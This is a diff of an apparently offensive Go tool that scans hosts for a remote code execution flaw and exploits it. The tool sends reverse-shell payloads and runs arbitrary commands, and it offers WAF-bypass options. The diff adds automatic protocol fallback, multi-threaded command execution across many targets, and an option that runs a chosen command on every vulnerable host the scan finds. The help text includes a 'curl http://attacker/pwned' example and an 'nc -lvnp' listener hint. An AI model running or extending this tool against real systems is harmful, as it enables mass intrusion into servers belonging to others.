@@ -22,7 +22,7 @@ import (
 )
 
 const (
-	Version  = "3.0.0"
+	Version  = "3.1.0"
 	Boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
 )
 
@@ -34,6 +34,13 @@ const (
 	Blue   = "\033[94m"
 	Gray   = "\033[90m"
 	Cyan   = "\033[96m"
+)
+
+// Protocol mode constants
+const (
+	ProtoAuto  = "auto"  // Try HTTPS first, fall back to HTTP
+	ProtoHTTPS = "https" // HTTPS only
+	ProtoHTTP  = "http"  // HTTP only
 )
 
 var rcePattern = regexp.MustCompile(`rce=11111`)
@@ -69,7 +76,7 @@ type ScanConfig struct {
 	Timeout         time.Duration
 	SafeMode        bool
 	Insecure        bool
-	UseTLS          bool
+	Protocol        string // "auto", "https", or "http"
 	Verbose         bool
 	JSONOutput      bool
 	Quiet           bool
@@ -78,13 +85,15 @@ type ScanConfig struct {
 	WAFBypass       bool
 	WAFBypassSizeKB int
 	VercelWAFBypass bool
+	ExecOnVuln      bool   // Execute command on vulnerable hosts
+	ExecCommand     string // Command to execute
 }
 
 type ExploitConfig struct {
 	Target       string
 	Port         int
 	Path         string
-	UseTLS       bool
+	Protocol     string // "auto", "https", or "http"
 	Insecure     bool
 	Timeout      time.Duration
 	ListenerIP   string
@@ -97,11 +106,12 @@ type ExecConfig struct {
 	Target   string
 	Port     int
 	Path     string
-	UseTLS   bool
+	Protocol string // "auto", "https", or "http"
 	Insecure bool
 	Timeout  time.Duration
 	Command  string
 	Verbose  bool
+	Threads  int // For multi-target mode
 }
 
 type Stats struct {
@@ -619,10 +629,28 @@ func sendRequestVerbose(client *http.Client, url, payload, contentType string, l
 	return resp, bodyStr, nil
 }
 
+// isProtocolMismatchError checks if the error indicates a protocol mismatch
+// (e.g., sending HTTPS to an HTTP server or vice versa)
+func isProtocolMismatchError(err error) bool {
+	if err == nil {
+		return false
+	}
+	errStr := err.Error()
+	// HTTP request sent to HTTPS server
+	if strings.Contains(errStr, "http: server gave HTTP response to HTTPS client") {
+		return true
+	}
+	// HTTPS request sent to HTTP server (TLS handshake failures)
+	if strings.Contains(errStr, "tls:") || strings.Contains(errStr, "first record does not look like a TLS handshake") {
+		return true
+	}
+	return false
+}
+
+// scanWithProtocol performs a scan with automatic protocol fallback
 func scan(host string, config *ScanConfig, client *http.Client) Result {
-	url := buildURL(host, config.Port, config.UseTLS, config.Path)
 	result := Result{
-		Host:      url,
+		Host:      host,
 		Timestamp: time.Now().Unix(),
 	}
 
@@ -637,36 +665,64 @@ func scan(host string, config *ScanConfig, client *http.Client) Result {
 		payload, contentType = rcePayload, rceContentType
 	}
 
-	resp, err := sendRequest(client, url, payload, contentType)
-	if err != nil {
-		result.Error = truncateError(err.Error())
+	// Determine which protocols to try based on config
+	var protocols []bool // true = TLS, false = plain HTTP
+	switch config.Protocol {
+	case ProtoHTTPS:
+		protocols = []bool{true}
+	case ProtoHTTP:
+		protocols = []bool{false}
+	default: // ProtoAuto - try HTTPS first, then HTTP
+		protocols = []bool{true, false}
+	}
+
+	var lastErr error
+	for i, useTLS := range protocols {
+		url := buildURL(host, config.Port, useTLS, config.Path)
+		result.Host = url
+
+		resp, err := sendRequest(client, url, payload, contentType)
+		if err != nil {
+			lastErr = err
+			// Check if we should try the other protocol
+			if i < len(protocols)-1 && isProtocolMismatchError(err) {
+				continue // Try next protocol
+			}
+			result.Error = truncateError(err.Error())
+			return result
+		}
+		defer resp.Body.Close()
+
+		result.StatusCode = int16(resp.StatusCode)
+
+		if !config.SafeMode {
+			if h := resp.Header.Get("X-Action-Redirect"); h != "" && rcePattern.MatchString(h) {
+				result.Vulnerable = true
+				result.Evidence = "RCE via X-Action-Redirect"
+				io.Copy(io.Discard, resp.Body)
+				return result
+			}
+			if h := resp.Header.Get("Location"); h != "" && rcePattern.MatchString(h) {
+				result.Vulnerable = true
+				result.Evidence = "RCE via Location"
+				io.Copy(io.Discard, resp.Body)
+				return result
+			}
+		}
+
+		vuln, evidence := checkResponseBody(resp, config.SafeMode)
+		if vuln {
+			result.Vulnerable = true
+			result.Evidence = evidence
+		}
+
 		return result
 	}
-	defer resp.Body.Close()
 
-	result.StatusCode = int16(resp.StatusCode)
-
-	if !config.SafeMode {
-		if h := resp.Header.Get("X-Action-Redirect"); h != "" && rcePattern.MatchString(h) {
-			result.Vulnerable = true
-			result.Evidence = "RCE via X-Action-Redirect"
-			io.Copy(io.Discard, resp.Body)
-			return result
-		}
-		if h := resp.Header.Get("Location"); h != "" && rcePattern.MatchString(h) {
-			result.Vulnerable = true
-			result.Evidence = "RCE via Location"
-			io.Copy(io.Discard, resp.Body)
-			return result
-		}
+	// If we get here, all protocols failed
+	if lastErr != nil {
+		result.Error = truncateError(lastErr.Error())
 	}
-
-	vuln, evidence := checkResponseBody(resp, config.SafeMode)
-	if vuln {
-		result.Vulnerable = true
-		result.Evidence = evidence
-	}
-
 	return result
 }
 
@@ -722,9 +778,7 @@ func truncateError(err string) string {
 }
 
 func exploit(config *ExploitConfig, logger *Logger) error {
-	url := buildURL(config.Target, config.Port, config.UseTLS, config.Path)
-
-	logger.Info("Target:   %s", url)
+	logger.Info("Target:   %s:%d", config.Target, config.Port)
 	logger.Info("Listener: %s:%d", config.ListenerIP, config.ListenerPort)
 	logger.Info("Shell:    %s", config.Shell)
 
@@ -734,45 +788,66 @@ func exploit(config *ExploitConfig, logger *Logger) error {
 
 	logger.Info("Sending payload...")
 
+	// Determine which protocols to try
+	var protocols []bool
+	switch config.Protocol {
+	case ProtoHTTPS:
+		protocols = []bool{true}
+	case ProtoHTTP:
+		protocols = []bool{false}
+	default: // ProtoAuto
+		protocols = []bool{true, false}
+	}
+
+	var lastErr error
 	var resp *http.Response
-	var err error
 	var bodyStr string
 
-	if config.Verbose {
-		resp, bodyStr, err = sendRequestVerbose(client, url, payload, contentType, logger)
-	} else {
-		resp, err = sendRequest(client, url, payload, contentType)
-		if resp != nil {
-			defer resp.Body.Close()
-			io.Copy(io.Discard, resp.Body)
+	for i, useTLS := range protocols {
+		url := buildURL(config.Target, config.Port, useTLS, config.Path)
+		logger.Info("Trying: %s", url)
+
+		var err error
+		if config.Verbose {
+			resp, bodyStr, err = sendRequestVerbose(client, url, payload, contentType, logger)
+		} else {
+			resp, err = sendRequest(client, url, payload, contentType)
+			if resp != nil {
+				defer resp.Body.Close()
+				io.Copy(io.Discard, resp.Body)
+			}
 		}
+
+		if err != nil {
+			lastErr = err
+			if i < len(protocols)-1 && isProtocolMismatchError(err) {
+				logger.Warning("Protocol mismatch, trying alternate...")
+				continue
+			}
+			return err
+		}
+
+		logger.Info("Response: %d", resp.StatusCode)
+
+		switch {
+		case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
+			logger.Success("Redirect received, payload likely executed")
+			logger.Success("Check your listener for incoming connection")
+		case resp.StatusCode == 500:
+			logger.Warning("Got 500, command may have executed")
+		default:
+			logger.Warning("Unexpected response, exploit may have failed")
+		}
+
+		_ = bodyStr
+		return nil
 	}
 
-	if err != nil {
-		return err
-	}
-
-	logger.Info("Response: %d", resp.StatusCode)
-
-	switch {
-	case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
-		logger.Success("Redirect received, payload likely executed")
-		logger.Success("Check your listener for incoming connection")
-	case resp.StatusCode == 500:
-		logger.Warning("Got 500, command may have executed")
-	default:
-		logger.Warning("Unexpected response, exploit may have failed")
-	}
-
-	_ = bodyStr
-
-	return nil
+	return lastErr
 }
 
 func execCmd(config *ExecConfig, logger *Logger) error {
-	url := buildURL(config.Target, config.Port, config.UseTLS, config.Path)
-
-	logger.Info("Target:  %s", url)
+	logger.Info("Target:  %s:%d", config.Target, config.Port)
 	logger.Info("Command: %s", config.Command)
 
 	payload, contentType := buildCustomCommandPayload(config.Command)
@@ -781,38 +856,107 @@ func execCmd(config *ExecConfig, logger *Logger) error {
 
 	logger.Info("Sending command...")
 
+	// Determine which protocols to try
+	var protocols []bool
+	switch config.Protocol {
+	case ProtoHTTPS:
+		protocols = []bool{true}
+	case ProtoHTTP:
+		protocols = []bool{false}
+	default: // ProtoAuto
+		protocols = []bool{true, false}
+	}
+
+	var lastErr error
 	var resp *http.Response
-	var err error
 	var bodyStr string
 
-	if config.Verbose {
-		resp, bodyStr, err = sendRequestVerbose(client, url, payload, contentType, logger)
-	} else {
-		resp, err = sendRequest(client, url, payload, contentType)
-		if resp != nil {
-			defer resp.Body.Close()
-			io.Copy(io.Discard, resp.Body)
+	for i, useTLS := range protocols {
+		url := buildURL(config.Target, config.Port, useTLS, config.Path)
+		logger.Info("Trying: %s", url)
+
+		var err error
+		if config.Verbose {
+			resp, bodyStr, err = sendRequestVerbose(client, url, payload, contentType, logger)
+		} else {
+			resp, err = sendRequest(client, url, payload, contentType)
+			if resp != nil {
+				defer resp.Body.Close()
+				io.Copy(io.Discard, resp.Body)
+			}
 		}
+
+		if err != nil {
+			lastErr = err
+			if i < len(protocols)-1 && isProtocolMismatchError(err) {
+				logger.Warning("Protocol mismatch, trying alternate...")
+				continue
+			}
+			return err
+		}
+
+		logger.Info("Response: %d", resp.StatusCode)
+
+		switch {
+		case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
+			logger.Success("Command executed (redirect received)")
+		case resp.StatusCode == 500:
+			logger.Warning("Got 500, command likely executed")
+		default:
+			logger.Warning("Unexpected response")
+		}
+
+		_ = bodyStr
+		return nil
 	}
 
-	if err != nil {
-		return err
+	return lastErr
+}
+
+// execCmdOnTarget executes command on a single target (used by worker pool)
+func execCmdOnTarget(target string, port int, path string, protocol string, insecure bool, timeout time.Duration, command string, client *http.Client, logger *Logger) error {
+	payload, contentType := buildCustomCommandPayload(command)
+
+	// Determine which protocols to try
+	var protocols []bool
+	switch protocol {
+	case ProtoHTTPS:
+		protocols = []bool{true}
+	case ProtoHTTP:
+		protocols = []bool{false}
+	default: // ProtoAuto
+		protocols = []bool{true, false}
 	}
 
-	logger.Info("Response: %d", resp.StatusCode)
+	var lastErr error
 
-	switch {
-	case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
-		logger.Success("Command executed (redirect received)")
-	case resp.StatusCode == 500:
-		logger.Warning("Got 500, command likely executed")
-	default:
-		logger.Warning("Unexpected response")
+	for i, useTLS := range protocols {
+		url := buildURL(target, port, useTLS, path)
+
+		resp, err := sendRequest(client, url, payload, contentType)
+		if err != nil {
+			lastErr = err
+			if i < len(protocols)-1 && isProtocolMismatchError(err) {
+				continue
+			}
+			return err
+		}
+		defer resp.Body.Close()
+		io.Copy(io.Discard, resp.Body)
+
+		switch {
+		case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
+			logger.Success("%s - Command executed (redirect received)", url)
+		case resp.StatusCode == 500:
+			logger.Warning("%s - Got 500, command likely executed", url)
+		default:
+			logger.Warning("%s - Unexpected response: %d", url, resp.StatusCode)
+		}
+
+		return nil
 	}
 
-	_ = bodyStr
-
-	return nil
+	return lastErr
 }
 
 type WorkerPool struct {
@@ -868,6 +1012,117 @@ func (wp *WorkerPool) Results() <-chan Result {
 	return wp.results
 }
 
+// ExecWorkerPool for running exec command on multiple targets
+type ExecWorkerPool struct {
+	workers  int
+	tasks    chan string
+	wg       sync.WaitGroup
+	config   *ExecConfig
+	client   *http.Client
+	logger   *Logger
+	success  int64
+	failed   int64
+}
+
+func NewExecWorkerPool(workers int, config *ExecConfig, logger *Logger) *ExecWorkerPool {
+	return &ExecWorkerPool{
+		workers: workers,
+		tasks:   make(chan string, workers*2),
+		config:  config,
+		client:  getHTTPClient(config.Timeout, config.Insecure),
+		logger:  logger,
+	}
+}
+
+func (wp *ExecWorkerPool) Start() {
+	for i := 0; i < wp.workers; i++ {
+		wp.wg.Add(1)
+		go wp.worker()
+	}
+}
+
+func (wp *ExecWorkerPool) worker() {
+	defer wp.wg.Done()
+
+	for target := range wp.tasks {
+		// Parse target (could be ip:port format)
+		host, port := parseTarget(target, wp.config.Port)
+		
+		err := execCmdOnTarget(host, port, wp.config.Path, wp.config.Protocol, 
+			wp.config.Insecure, wp.config.Timeout, wp.config.Command, wp.client, wp.logger)
+		
+		if err != nil {
+			atomic.AddInt64(&wp.failed, 1)
+			wp.logger.Error("%s - Execution failed: %v", target, err)
+		} else {
+			atomic.AddInt64(&wp.success, 1)
+		}
+	}
+}
+
+func (wp *ExecWorkerPool) Submit(target string) {
+	wp.tasks <- target
+}
+
+func (wp *ExecWorkerPool) Close() {
+	close(wp.tasks)
+	wp.wg.Wait()
+	putHTTPClient(wp.client)
+}
+
+func (wp *ExecWorkerPool) Stats() (success, failed int64) {
+	return atomic.LoadInt64(&wp.success), atomic.LoadInt64(&wp.failed)
+}
+
+// parseTarget parses a target string that may contain port (ip:port or just ip)
+func parseTarget(target string, defaultPort int) (string, int) {
+	target = strings.TrimSpace(target)
+	
+	// Remove protocol prefix if present
+	if strings.HasPrefix(target, "https://") {
+		target = target[8:]
+	} else if strings.HasPrefix(target, "http://") {
+		target = target[7:]
+	}
+	
+	// Check for port
+	if idx := strings.LastIndex(target, ":"); idx != -1 {
+		// Make sure it's not an IPv6 address without port
+		if !strings.Contains(target[idx:], "]") {
+			host := target[:idx]
+			portStr := target[idx+1:]
+			// Remove any path
+			if pathIdx := strings.Index(portStr, "/"); pathIdx != -1 {
+				portStr = portStr[:pathIdx]
+			}
+			var port int
+			fmt.Sscanf(portStr, "%d", &port)
+			if port > 0 && port <= 65535 {
+				return host, port
+			}
+		}
+	}
+	
+	// Remove any path from host
+	if pathIdx := strings.Index(target, "/"); pathIdx != -1 {
+		target = target[:pathIdx]
+	}
+	
+	return target, defaultPort
+}
+
+// parseTargetList parses a comma-separated list of targets
+func parseTargetList(targetList string) []string {
+	var targets []string
+	for _, t := range strings.Split(targetList, ",") {
+		t = strings.TrimSpace(t)
+		if t != "" {
+			targets = append(targets, t)
+		}
+	}
+	return targets
+}
+
 func runScan(targets []string, config *ScanConfig, output string, logger *Logger) {
 	initPayloads()
 
@@ -901,11 +1156,16 @@ func runScan(targets []string, config *ScanConfig, output string, logger *Logger
 		logger.Info("Targets: %d | Threads: %d | Stream: %v", len(targets), config.Threads, config.StreamMode)
 	}
 
+	logger.Info("Protocol mode: %s", config.Protocol)
+
 	if config.WAFBypass {
 		logger.Info("WAF bypass enabled (%dKB junk data)", config.WAFBypassSizeKB)
 	}
 	if config.VercelWAFBypass {
 		logger.Info("Vercel WAF bypass mode enabled")
+	}
+	if config.ExecOnVuln {
+		logger.Info("Will execute command on vulnerable hosts: %s", config.ExecCommand)
 	}
 
 	pool := NewWorkerPool(config.Threads, config, memLimiter)
@@ -921,6 +1181,13 @@ func runScan(targets []string, config *ScanConfig, output string, logger *Logger
 	lastProgressUpdate := time.Now()
 	progressInterval := 100 * time.Millisecond
 
+	// Client for exec-on-vuln
+	var execClient *http.Client
+	if config.ExecOnVuln {
+		execClient = getHTTPClient(config.Timeout, config.Insecure)
+		defer putHTTPClient(execClient)
+	}
+
 	for result := range pool.Results() {
 		scanned := atomic.AddInt64(&stats.Scanned, 1)
 
@@ -928,6 +1195,16 @@ func runScan(targets []string, config *ScanConfig, output string, logger *Logger
 			atomic.AddInt64(&stats.Vulnerable, 1)
 			logger.ClearLine()
 			logger.Vuln(result.Host, result.Evidence)
+
+			// Execute command on vulnerable host if enabled
+			if config.ExecOnVuln && config.ExecCommand != "" {
+				host, port := parseTarget(result.Host, config.Port)
+				err := execCmdOnTarget(host, port, config.Path, config.Protocol,
+					config.Insecure, config.Timeout, config.ExecCommand, execClient, logger)
+				if err != nil {
+					logger.Error("Failed to execute command on %s: %v", result.Host, err)
+				}
+			}
 
 			if config.StreamMode && outWriter != nil {
 				outWriter.WriteString(result.Host + "\n")
@@ -1054,7 +1331,7 @@ func cmdScan() {
 	listFile := fs.String("l", "", "File with targets (one per line)")
 	port := fs.Int("p", 443, "Target port")
 	path := fs.String("path", "/", "Request path")
-	noTLS := fs.Bool("no-tls", false, "Use HTTP instead of HTTPS")
+	protocol := fs.String("proto", "auto", "Protocol: auto (try both), https, http")
 	insecure := fs.Bool("k", true, "Skip TLS verification")
 	timeout := fs.Int("timeout", 10, "Timeout in seconds")
 	threads := fs.Int("t", 10, "Concurrent threads")
@@ -1068,6 +1345,8 @@ func cmdScan() {
 	wafBypass := fs.Bool("waf-bypass", false, "Add junk data to bypass WAF content inspection")
 	wafBypassSize := fs.Int("waf-bypass-size", 128, "Size of junk data in KB for WAF bypass")
 	vercelWAFBypass := fs.Bool("vercel-waf-bypass", false, "Use Vercel WAF bypass payload variant")
+	execOnVuln := fs.Bool("exec-on-vuln", false, "Execute command on vulnerable hosts")
+	execCommand := fs.String("exec-cmd", "", "Command to execute on vulnerable hosts (requires -exec-on-vuln)")
 	fs.Parse(os.Args[2:])
 
 	logger := NewLogger(*quiet, *jsonOut)
@@ -1075,6 +1354,19 @@ func cmdScan() {
 	if *target == "" && *listFile == "" {
 		logger.Error("Specify target with -u or list with -l")
 		fs.PrintDefaults()
+		os.Exit(1)
+	}
+
+	// Validate protocol
+	proto := strings.ToLower(*protocol)
+	if proto != ProtoAuto && proto != ProtoHTTPS && proto != ProtoHTTP {
+		logger.Error("Invalid protocol: %s (use: auto, https, http)", *protocol)
+		os.Exit(1)
+	}
+
+	// Validate exec-on-vuln options
+	if *execOnVuln && *execCommand == "" {
+		logger.Error("-exec-on-vuln requires -exec-cmd to be specified")
 		os.Exit(1)
 	}
 
@@ -1107,7 +1399,7 @@ func cmdScan() {
 		Timeout:         time.Duration(actualTimeout) * time.Second,
 		SafeMode:        *safeMode,
 		Insecure:        *insecure,
-		UseTLS:          !*noTLS,
+		Protocol:        proto,
 		Verbose:         *verbose,
 		JSONOutput:      *jsonOut,
 		Quiet:           *quiet,
@@ -1116,6 +1408,8 @@ func cmdScan() {
 		WAFBypass:       *wafBypass,
 		WAFBypassSizeKB: *wafBypassSize,
 		VercelWAFBypass: *vercelWAFBypass,
+		ExecOnVuln:      *execOnVuln,
+		ExecCommand:     *execCommand,
 	}
 
 	runScan(targets, config, *output, logger)
@@ -1126,7 +1420,7 @@ func cmdExploit() {
 	target := fs.String("u", "", "Target URL or IP")
 	port := fs.Int("p", 443, "Target port")
 	path := fs.String("path", "/", "Request path")
-	noTLS := fs.Bool("no-tls", false, "Use HTTP")
+	protocol := fs.String("proto", "auto", "Protocol: auto (try both), https, http")
 	insecure := fs.Bool("k", true, "Skip TLS verification")
 	timeout := fs.Int("timeout", 30, "Timeout in seconds")
 	lhost := fs.String("lhost", "", "Listener IP")
@@ -1146,13 +1440,20 @@ func cmdExploit() {
 		os.Exit(1)
 	}
 
+	// Validate protocol
+	proto := strings.ToLower(*protocol)
+	if proto != ProtoAuto && proto != ProtoHTTPS && proto != ProtoHTTP {
+		logger.Error("Invalid protocol: %s (use: auto, https, http)", *protocol)
+		os.Exit(1)
+	}
+
 	logger.Warning("Start listener first: nc -lvnp %d", *lport)
 
 	config := &ExploitConfig{
 		Target:       *target,
 		Port:         *port,
 		Path:         *path,
-		UseTLS:       !*noTLS,
+		Protocol:     proto,
 		Insecure:     *insecure,
 		Timeout:      time.Duration(*timeout) * time.Second,
 		ListenerIP:   *lhost,
@@ -1169,14 +1470,15 @@ func cmdExploit() {
 
 func cmdExec() {
 	fs := flag.NewFlagSet("exec", flag.ExitOnError)
-	target := fs.String("u", "", "Target URL or IP")
-	port := fs.Int("p", 443, "Target port")
+	target := fs.String("u", "", "Target(s): single IP, URL, or comma-separated list (ip:port,ip:port)")
+	port := fs.Int("p", 443, "Default target port (used if not specified in target)")
 	path := fs.String("path", "/", "Request path")
-	noTLS := fs.Bool("no-tls", false, "Use HTTP")
+	protocol := fs.String("proto", "auto", "Protocol: auto (try both), https, http")
 	insecure := fs.Bool("k", true, "Skip TLS verification")
 	timeout := fs.Int("timeout", 30, "Timeout in seconds")
 	command := fs.String("c", "", "Command to execute")
 	verbose := fs.Bool("v", false, "Verbose output (show full request/response)")
+	threads := fs.Int("t", 10, "Concurrent threads (for multiple targets)")
 	fs.Parse(os.Args[2:])
 
 	logger := NewLogger(false, false)
@@ -1190,20 +1492,58 @@ func cmdExec() {
 		os.Exit(1)
 	}
 
-	config := &ExecConfig{
-		Target:   *target,
-		Port:     *port,
-		Path:     *path,
-		UseTLS:   !*noTLS,
-		Insecure: *insecure,
-		Timeout:  time.Duration(*timeout) * time.Second,
-		Command:  *command,
-		Verbose:  *verbose,
+	// Validate protocol
+	proto := strings.ToLower(*protocol)
+	if proto != ProtoAuto && proto != ProtoHTTPS && proto != ProtoHTTP {
+		logger.Error("Invalid protocol: %s (use: auto, https, http)", *protocol)
+		os.Exit(1)
 	}
 
-	if err := execCmd(config, logger); err != nil {
-		logger.Error("Execution failed: %v", err)
-		os.Exit(1)
+	// Check if multiple targets (comma-separated)
+	targets := parseTargetList(*target)
+	
+	if len(targets) == 1 {
+		// Single target mode
+		config := &ExecConfig{
+			Target:   targets[0],
+			Port:     *port,
+			Path:     *path,
+			Protocol: proto,
+			Insecure: *insecure,
+			Timeout:  time.Duration(*timeout) * time.Second,
+			Command:  *command,
+			Verbose:  *verbose,
+		}
+
+		if err := execCmd(config, logger); err != nil {
+			logger.Error("Execution failed: %v", err)
+			os.Exit(1)
+		}
+	} else {
+		// Multi-target mode
+		logger.Info("Executing command on %d targets with %d threads", len(targets), *threads)
+		
+		config := &ExecConfig{
+			Port:     *port,
+			Path:     *path,
+			Protocol: proto,
+			Insecure: *insecure,
+			Timeout:  time.Duration(*timeout) * time.Second,
+			Command:  *command,
+			Threads:  *threads,
+		}
+
+		pool := NewExecWorkerPool(*threads, config, logger)
+		pool.Start()
+
+		for _, t := range targets {
+			pool.Submit(t)
+		}
+
+		pool.Close()
+
+		success, failed := pool.Stats()
+		logger.Info("Completed: %d success, %d failed", success, failed)
 	}
 }
 
@@ -1216,7 +1556,7 @@ Usage:
 Commands:
   scan      Scan targets for vulnerability
   exploit   Send reverse shell payload
-  exec      Execute arbitrary command
+  exec      Execute arbitrary command (supports multiple targets)
   version   Show version
   help      Show this help
 
@@ -1224,23 +1564,32 @@ Scan Examples:
   %s scan -u example.com
   %s scan -l targets.txt -t 50 -o vuln.txt
   %s scan -l targets.txt -t 100 -max-mem 256 -stream
-  %s scan -u 192.168.1.100 -p 3000 -no-tls -safe
+  %s scan -u 192.168.1.100 -p 3000 -proto http -safe
   %s scan -u example.com -waf-bypass
-  %s scan -u example.com -waf-bypass -waf-bypass-size 256
-  %s scan -u example.com -vercel-waf-bypass
+  %s scan -u example.com -proto https              # HTTPS only
+  %s scan -u example.com -proto http               # HTTP only
+  %s scan -u example.com -proto auto               # Try both (default)
+  %s scan -l targets.txt -exec-on-vuln -exec-cmd 'curl http://attacker/pwned'
 
 Exploit Examples:
   %s exploit -u example.com -lhost 10.0.0.5 -lport 4444
   %s exploit -u example.com -lhost 10.0.0.5 -lport 4444 -v
+  %s exploit -u 192.168.1.100 -p 3000 -proto http -lhost 10.0.0.5
+
+Exec Examples:
   %s exec -u example.com -c 'id'
   %s exec -u example.com -c 'id' -v
+  %s exec -u example.com -c 'id' -proto http
+  %s exec -u "192.168.1.1:8080,192.168.1.2:8080,192.168.1.3" -c 'whoami' -t 5
+  %s exec -u "10.0.0.1,10.0.0.2:3000,10.0.0.3" -p 443 -c 'id'
 
 Scan Options:
   -u              Single target URL or IP
   -l              File with targets (one per line)
   -p              Target port (default: 443)
   -path           Request path (default: /)
-  -no-tls         Use HTTP instead of HTTPS
+  -proto          Protocol mode: auto, https, http (default: auto)
+                  auto = try HTTPS first, fall back to HTTP on protocol mismatch
   -k              Skip TLS verification (default: true)
   -timeout        Timeout in seconds (default: 10)
   -t              Concurrent threads (default: 10)
@@ -1254,12 +1603,14 @@ Scan Options:
   -waf-bypass     Add junk data to bypass WAF content inspection
   -waf-bypass-size Size of junk data in KB (default: 128)
   -vercel-waf-bypass Use Vercel WAF bypass payload variant
+  -exec-on-vuln   Execute command on vulnerable hosts found during scan
+  -exec-cmd       Command to execute on vulnerable hosts (requires -exec-on-vuln)
 
 Exploit/Exec Options:
-  -u              Target URL or IP
-  -p              Target port (default: 443)
+  -u              Target URL or IP (exec supports comma-separated list: ip:port,ip:port)
+  -p              Target port (default: 443, used if not specified in target)
   -path           Request path (default: /)
-  -no-tls         Use HTTP instead of HTTPS
+  -proto          Protocol mode: auto, https, http (default: auto)
   -k              Skip TLS verification (default: true)
   -timeout        Timeout in seconds (default: 30)
   -v              Verbose output (show full request/response)
@@ -1271,9 +1622,10 @@ Exploit-specific:
 
 Exec-specific:
   -c              Command to execute
+  -t              Concurrent threads for multiple targets (default: 10)
 
 Run '%s <command> -h' for command-specific options.
-`, Version, os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0])
+`, Version, os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0])
 }
 
 var _ = httputil.DumpRequest
